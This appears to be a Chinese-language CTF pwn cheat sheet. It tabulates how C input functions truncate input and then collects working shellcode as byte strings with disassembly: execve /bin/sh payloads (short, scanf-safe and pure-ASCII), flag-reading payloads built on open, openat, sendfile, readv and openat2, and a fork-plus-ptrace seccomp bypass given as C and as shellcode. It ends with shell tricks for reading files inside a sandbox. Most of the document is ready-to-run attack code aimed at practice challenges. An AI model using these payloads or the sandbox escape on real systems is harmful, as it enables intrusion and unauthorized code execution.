---
title: shellcode
date: 2024-08-30 22:11:42
---

# 各种读取函数的截断
| 函数                   | 截断字符                           | 截断属性                                                   | 截断字符是否保留 | 截断后加 |
| ---------------------- | ---------------------------------- | ---------------------------------------------------------- | ---------------- | -------- |
| `read(0,a,0x100)`      | EOF                                | 无                                                         | 无               | 无       |
| `*a=getchar()`         | EOF                                | 无                                                         | 无               | 无       |
| `scanf("%c",a)`        | EOF                                | 无                                                         | 无               | 无       |
| `scanf("%s",a)`        | EOF 0x09 0x0a 0x0b 0x0c 0x0d 0x20  | 截断字符前有有效内容则截断，无有效内容则跳过截断字符读后面 | 不保留           | 0x00     |
| `sscanf(a,"%s",b)`     | 0x00 0x09 0x0a 0x0b 0x0c 0x0d 0x20 | 截断字符前有有效内容则截断，无有效内容则跳过截断字符读后面 | 不保留           | 0x00     |
| `gets(a)`              | EOF 0x0a                           | 截断字符前无论有无有效内容均截断                           | 不保留           | 0x00     |
| `fgets(a,0x100,stdin)` | EOF 0x0a                           | 截断字符前无论有无有效内容均截断                           | 保留             | 0x00     |
| `sscanf(a,"%[^;];",b)` | 0x00 0x3b                          | 无                                                         | 不保留           | 0x00     |
| `sprintf(b,"%s",a)`    | 0x00                               | 无                                                         | 保留             | 无       |
| `strcpy(b,a)`          | 0x00                               | 无                                                         | 保留             | 无       |
| `strcat(b,a)`          | 0x00                               | 无                                                         | 保留             | 无       |
| `strncat(b,a,0x10)`    | 0x00                               | 无                                                         | 保留             | 无       |
| `strncat(b,a,0x10)`    | 达到拷贝长度                       | 无                                                         | 保留             | 0x00 |

# shellcode
关于系统调用号：[syscall](/pwn/syscall)

下面给出了收集到的shellcode，将部分可能需要修改的shellcode反编译出来了，一些有特殊限制的就没有给出反编译结果
## 64位
### execve
> 一般没有禁用execve就会用execve来拿shell，如果禁了(KILL)就不要想着拿shell了，因为你拿到的shell输入的命令也要用execve，同样会被禁
#### scanf可读取 22字节
```python
b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
```
```x86asm
xor    rsi, rsi
push   rsi
movabs rdi, 0x68732f2f6e69622f
push   rdi
push   rsp
pop    rdi
mov    al, 0x3b
cdq    
syscall
```

#### 纯ascii字符
```python
b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
```

### orw
#### open read wirte
```python
b"hflagH\x89\xe71\xf6j\x02X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05"
```
```x86asm
push   0x67616c66
mov    rdi, rsp
xor    esi, esi
push   0x2
pop    rax
syscall 
mov    rdi, rax
mov    rsi, rsp
mov    edx, 0x100
xor    eax, eax
syscall 
mov    edi, 0x1
mov    rsi, rsp
push   0x1
pop    rax
syscall
```

#### openat sendfile
> open系统调用实际上是调用了openat，如果open被禁了就直接用openat吧;同时sendfile还可以同时进行读写，真不错
```python
b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05'
```
```x86asm
mov rax,0x0067616c662f
push rax
mov rsi,rsp
xor rdx,rdx
mov rax,257
syscall
xor rdi,rdi
inc rdi
mov rsi,rax
xor rdx,rdx
mov r10,0x100 # 读取文件的长度,不够就加
mov rax,40
syscall
```

#### openat readv writev
> 也可以用，将sendfile变成了读写两个系统调用，同时利用栈作为缓冲区
```python
b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H\x89\xc7h\x00\x01\x00\x00H\x89\xe3H\x81\xeb\x08\x01\x00\x00SH\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x13\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x14\x00\x00\x00\x0f\x05'
```
```x86asm
mov rax,0x0067616c662f
push rax
mov rsi,rsp
xor rdx,rdx
mov rax,257
syscall
mov rdi,rax
push 0x100 # 读入大小由这个控制
mov rbx,rsp
sub rbx,0x108 # 为读入大小加8
push rbx
mov rsi,rsp
mov rdx,1
mov rax,19
syscall
mov rdi,1
mov rsi,rsp
mov rdx,1
mov rax,20
syscall
```

#### openat2 read write
> open,openat都被禁了，用openat2，但要注意openat2系统调用是在kernel5.6版本引入的，因此ubuntu20.04及以下的版本是不支持该系统调用的
```python
b'H\xc7\xc0flagPH1\xffH\x83\xefdH\x89\xe6j\x00j\x00j\x00H\x89\xe2I\xc7\xc2\x18\x00\x00\x00h\xb5\x01\x00\x00X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05'
```
```x86asm
mov rax, 0x67616c66 # 路径
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
push 0
push 0
push 0
mov rdx, rsp
mov r10, 0x18
push SYS_openat2 # pwntools预定义的系统调用号,也可以手动查
pop rax
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall
mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
```

### fork ptrace
> 有时我们会遇到返回TRACE的沙箱，并且题目没有禁用fork和ptrace，这就给了我们绕过沙箱的手段
下面是一个示例程序，我们可以看到，题目对execve,execveat,open,openat,openat2都加了限制，但返回的不是KILL，而是TRACE;
于是我们就可以通过fork加ptrace的方式绕过沙箱，拿到shell
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <seccomp.h>
#include <time.h>

struct timespec t = {1,0};

void sandbox()
{
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_ALLOW);
    seccomp_rule_add(ctx,SCMP_ACT_TRACE(0),SCMP_SYS(execve),0);
    seccomp_rule_add(ctx,SCMP_ACT_TRACE(1),SCMP_SYS(execveat),0);
    seccomp_rule_add(ctx,SCMP_ACT_TRACE(2),SCMP_SYS(open),0);
    seccomp_rule_add(ctx,SCMP_ACT_TRACE(3),SCMP_SYS(openat),0);
    seccomp_rule_add(ctx,SCMP_ACT_TRACE(4),SCMP_SYS(openat2),0);
    seccomp_load(ctx);
}

int main()
{
    sandbox();

    // fork出子进程
    pid_t pid = syscall(SYS_fork);

    if(pid<0)
    {
        // fork错误直接退出
        syscall(SYS_write,STDOUT_FILENO,"fork error!\n",12);
        syscall(SYS_exit,0);
    }

    if(pid==0)
    {
        // 子进程
        // 不断执行sleep(1),printf("child execve\n"),execve("/bin/bash",0,0)
        while(1)
        {
            syscall(SYS_nanosleep,t,0);
            syscall(SYS_write,STDOUT_FILENO,"child execve\n",13);
            syscall(SYS_execve,"/bin/bash",0,0);
        }
    }
    else
    {
        // 父进程
        // 首先attach到子进程上
        syscall(SYS_ptrace,PTRACE_ATTACH,pid,0,0);
        syscall(SYS_write,STDOUT_FILENO,"father attach\n",14);
        while(1)
        {
            // 不断等待子进程改变状态，在本题即为等待子进程触发seccomp然后stop
            syscall(SYS_wait4,pid,0,0,0);
            // 设置跟踪seccomp,并且在子进程触发seccomp时stop子进程
            syscall(SYS_ptrace,PTRACE_SETOPTIONS,pid,0,PTRACE_O_TRACESECCOMP);
            // 使子进程继续执行，并且此时没有了seccomp的检测，即成功绕过seccomp
            syscall(SYS_ptrace,PTRACE_CONT,pid,0,0);
        }
    }
}
```
编写成shellcode如下,去掉了中间用write输出的提示信息,长度为203字节
```python
b'H\xc7\xc09\x00\x00\x00\x0f\x05H\x85\xc0\x0f\x88\xad\x00\x00\x00H\x83\xf8\x00tiI\x89\xc0L\x89\xc6H\xc7\xc0e\x00\x00\x00H\xc7\xc7\x10\x00\x00\x00H1\xd2M1\xd2\x0f\x05L\x89\xc7H1\xf6H1\xd2M1\xd2H\xc7\xc0=\x00\x00\x00\x0f\x05H\xc7\xc7\x00B\x00\x00L\x89\xc6H1\xd2I\xc7\xc2\x80\x00\x00\x00H\xc7\xc0e\x00\x00\x00\x0f\x05H\xc7\xc7\x07\x00\x00\x00L\x89\xc6H1\xd2M1\xd2H\xc7\xc0e\x00\x00\x00\x0f\x05\xeb\xb3j\x00j\x01H\x89\xe7H1\xf6H\xc7\xc0#\x00\x00\x00\x0f\x05H\xc7\xc0h\x00\x00\x00PH\xb8/bin/basPH\x89\xe7H\xc7\xc6\x00\x00\x00\x00H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05\xeb\xc2H\xc7\xc0<\x00\x00\x00H1\xff\x0f\x05'
```
汇编也放一下
```x86asm
_start:
    /* fork() */
    mov rax,57
    syscall

    /* if(pid<0) exit(0) */
    test rax,rax
    js _exit

    /* if(pid==0) */
    cmp rax,0
    je child_process

parent_process:
    /* save pid with r8 */
    mov r8,rax
    mov rsi,r8

    /* ptrace(PTRACE_ATTACH,pid,0,0); */
    mov rax,101
    mov rdi,0x10
    xor rdx,rdx
    xor r10,r10
    syscall

monitor_child:
    /* wait4(pid,0,0,0); */
    mov rdi,r8
    xor rsi,rsi
    xor rdx,rdx
    xor r10,r10
    mov rax,61
    syscall

    /* ptrace(PTRACE_SETOPTIONS, child_pid, 0, PTRACE_O_TRACESECCOMP) */
    mov rdi,0x4200 /* PTRACE_SETOPTIONS */
    mov rsi,r8
    xor rdx,rdx
    mov r10,0x00000080 /* PTRACE_O_TRACESECCOMP */
    mov rax,101
    syscall

    /* ptrace(PTRACE_CONT,pid,0,0) */
    mov rdi,0x7
    mov rsi,r8
    xor rdx,rdx
    xor r10,r10
    mov rax,101
    syscall

    jmp monitor_child

child_process:
    /* syscall(SYS_nanosleep,t,0) */
    push 0
    push 1
    mov rdi,rsp
    xor rsi,rsi
    mov rax,0x23
    syscall

    /* execve("/bin/bash",0,0) */
    mov rax,0x0068 /* "h\x00" */
    push rax
    mov rax,0x7361622f6e69622f /* "/bin/bas" */
    push rax
    mov rdi,rsp
    mov rsi,0
    xor rdx,rdx
    mov rax,59
    syscall

    jmp child_process

_exit:
    /* exit(0) */
    mov rax,60
    xor rdi,rdi
    syscall

```

注意一下这样最终拿到的shell仍然是在沙箱环境下的，除了基本的cd,pwd,echo，很多命令执行不了，而且echo也只有部分功能
这边给出ls和读flag的方法
```shell
# ls
echo *

# cat flag
read -r f < flag
echo ${f}
```

## 32位
### execve
#### 较短 21字节
> 由于中间有个'\x0b'，所以scanf读不进去
```python
b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```
```x86asm
push   0xb
pop    eax
cdq
push   edx
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
xor    ecx, ecx
int    0x80
```

#### scanf可读取
> 较长，但是可以被scanf读取
```python
b"\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh"
```

#### 纯ascii字符
```python
b"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA"
```

# 参考资料
[CTF中常见的C语言输入函数截断属性总结](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/)
[Ubuntu 发行版本与内核对应关系](https://blog.csdn.net/FLM19990626/article/details/129154795)
[shellcode进阶之手写shellcode](https://xz.aliyun.com/t/13813)
[各种seccomp绕过](https://blog.csdn.net/qq_54218833/article/details/134205383)
